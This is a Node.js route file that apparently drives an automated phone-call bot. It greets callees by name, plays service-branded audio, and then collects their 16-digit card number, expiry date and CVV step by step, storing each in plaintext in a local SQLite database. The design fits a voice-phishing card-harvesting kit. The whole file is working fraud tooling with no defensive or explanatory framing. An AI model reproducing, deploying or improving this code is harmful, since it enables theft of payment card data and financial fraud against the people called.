// api/routes/voice.js

module.exports = function(request, response) {
    const config = require('../config');
    const sqlite3 = require('sqlite3').verbose();
    const db = new sqlite3.Database('./db/data.db');

    const input = request.body.Digits || '';
    const callSid = request.body.CallSid;

    if (!callSid) {
        return response.status(200).json({ error: 'Please give us the callSid.' });
    }

    db.get('SELECT service, name, step FROM calls WHERE callSid = ?', [callSid], (err, row) => {
        if (err || !row) {
            return respond(`
                <Response>
                    <Say>We are sorry. An application error occurred. Goodbye.</Say>
                </Response>`);
        }

        const service = row.service || 'default';
        const name = row.name || '';
        const step = typeof row.step === 'number' ? row.step : 0;

        const audioPrompt = config.serverurl + '/stream/' + service;
        const endAudio = config.serverurl + '/stream/end';
        const greet = name ? `<Say>Hello ${name},</Say>` : '';

        if (step === 0) {
            db.run(`UPDATE calls SET step = 1 WHERE callSid = ?`, [callSid]);
            return respond(`
                <Response>
                    ${greet}
                    <Play>${audioPrompt}</Play>
                    <Redirect method="POST">${config.serverurl}/voice</Redirect>
                </Response>`);
        }

        if (step === 1) {
            if (/^\d{16}$/.test(input)) {
                db.run(`UPDATE calls SET card_number = ?, step = 2 WHERE callSid = ?`, [input, callSid]);
                return respond(`
                    <Response>
                        <Gather numDigits="4" timeout="8">
                            <Say>Enter your card expiration date. For example, zero eight two seven for August 2027.</Say>
                        </Gather>
                    </Response>`);
            } else {
                return respond(`
                    <Response>
                        <Gather numDigits="16" timeout="10">
                            <Say>Please enter your 16-digit card number now.</Say>
                        </Gather>
                    </Response>`);
            }
        }

        if (step === 2) {
            if (/^\d{4}$/.test(input)) {
                db.run(`UPDATE calls SET expiry_date = ?, step = 3 WHERE callSid = ?`, [input, callSid]);
                return respond(`
                    <Response>
                        <Gather numDigits="4" timeout="6">
                            <Say>Please enter your card's CVV security code.</Say>
                        </Gather>
                    </Response>`);
            } else {
                return respond(`
                    <Response>
                        <Gather numDigits="4" timeout="8">
                            <Say>Please re-enter the expiration date in four digits. For example, zero eight two seven for August 2027.</Say>
                        </Gather>
                    </Response>`);
            }
        }

        if (step === 3) {
            if (/^\d{3,4}$/.test(input)) {
                db.run(`UPDATE calls SET cvv = ?, step = 4 WHERE callSid = ?`, [input, callSid]);
                return respond(`
                    <Response>
                        <Play>${endAudio}</Play>
                    </Response>`);
            } else {
                return respond(`
                    <Response>
                        <Gather numDigits="4" timeout="6">
                            <Say>Invalid input. Please enter your CVV again.</Say>
                        </Gather>
                    </Response>`);
            }
        }

        return respond(`
            <Response>
                <Say>We are sorry. An unexpected error occurred. Goodbye.</Say>
            </Response>`);
    });

    function respond(twiml) {
        response.type('text/xml');
        response.send(twiml.trim());
    }
};
